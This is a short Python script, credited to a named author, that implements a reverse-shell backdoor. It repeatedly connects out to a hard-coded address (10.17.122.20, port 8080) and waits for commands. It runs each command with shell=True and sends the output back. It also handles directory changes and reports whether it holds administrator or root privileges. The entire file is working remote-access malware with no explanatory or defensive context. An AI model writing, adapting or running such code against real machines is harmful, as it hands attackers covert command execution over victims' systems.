# Created by Louis Kraimer

import socket
import subprocess
import os
import sys
import time

def tuneconnection():
    mysocket = socket.socket()
    while True:
        time.sleep(10)
        try:
            mysocket.connect(("10.17.122.20", 8080))
            shell(mysocket)
        except:
            tuneconnection()

def shell(mysocket):
    while True:
        command = mysocket.recv(5000)
        if "seeya" in command.decode():
            try:
                mysocket.close()
                break
            except Exception as e:
                informToServer = "!ERR!: " + str(e)
                mysocket.send(informToServer.encode())
                break
        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ", 1)
                os.chdir(directory)
                informToServer = "Current Working Directory is: " + os.getcwd()
                mysocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "!ERR!: " + str(e)
                mysocket.send(informToServer.encode())
        elif 'checkUserLevel' in command.decode():
            try:
                admin = 'admin' in os.popen('whoami /groups').read().lower() if sys.platform.startswith(
                    "win") else os.geteuid() == 0
                perms = "[+] Administrator Privileges." if admin else "[!!] User Privileges. (No Admin privileges)"
                mysocket.send(perms.encode())
            except Exception as e:
                mysocket.send(f"[+] Some error occurred: {str(e)}".encode())

        else:
            cmd = subprocess.Popen(command.decode(), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            mysocket.send(cmd.stdout.read())
            mysocket.send(cmd.stderr.read())
def main():
    tuneconnection()
main()

